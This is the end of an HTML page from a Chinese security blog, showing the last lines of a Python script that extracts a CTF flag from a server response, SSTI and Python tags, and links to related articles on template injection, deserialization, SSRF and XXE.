+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag\{.*?\}&#39;</span><span class=p>,</span> <span class=n>response</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag found:&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=o>.</span><span class=n>group</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag not found!&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/python/>Python</a>
+<a href=/tags/ssti/>SSTI</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/><div class=article-image><img src=/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/cover.6aa08be868b922f6c20a325120bcdc3d_hu15322413963489602941.png width=250 height=150 loading=lazy alt="Featured image of post python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注" data-hash="md5-aqCL6Gi5IvbCCjJRILzcPQ=="></div><div class=article-details><h2 class=article-title>python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注</h2></div></a></article><article class=has-image><a href=/p/php%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-twig%E7%AF%87/><div class=article-image><img src=/p/php%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-twig%E7%AF%87/cover.488d1683dbd02cbe0b4da353c05d51fd_hu18438151520872597437.png width=250 height=150 loading=lazy alt="Featured image of post PHP模板注入漏洞-Twig篇" data-hash="md5-SI0Wg9vQLL4LTaNTwF1R/Q=="></div><div class=article-details><h2 class=article-title>PHP模板注入漏洞-Twig篇</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/cover.219e4f4fa8211da393cb0b02dc2d7896_hu9784503260805164296.png width=250 height=150 loading=lazy alt="Featured image of post Java反序列化-01" data-hash="md5-IZ5PT6ghHaOTywsC3C14lg=="></div><div class=article-details><h2 class=article-title>Java反序列化-01</h2></div></a></article><article class=has-image><a href=/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/><div class=article-image><img src=/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/cover.7f20e428434e766f63521f69127d89fe_hu15225852805790229622.png width=250 height=150 loading=lazy alt="Featured image of post SSRF-Redis未授权访问利用" data-hash="md5-fyDkKENOdm9jUh9pEn2J/g=="></div><div class=article-details><h2 class=article-title>SSRF-Redis未授权访问利用</h2></div></a></article><article class=has-image><a href=/p/javaxxe/><div class=article-image><img src=/p/javaxxe/cover.a648859bf6fb68782b208d08dce2d067_hu1011878124423468307.png width=250 height=150 loading=lazy alt="Featured image of post JavaXXE" data-hash="md5-pkiFm/b7aHgrII0I3OLQZw=="></div><div class=article-details><h2 class=article-title>JavaXXE</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2025 hadagaga blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
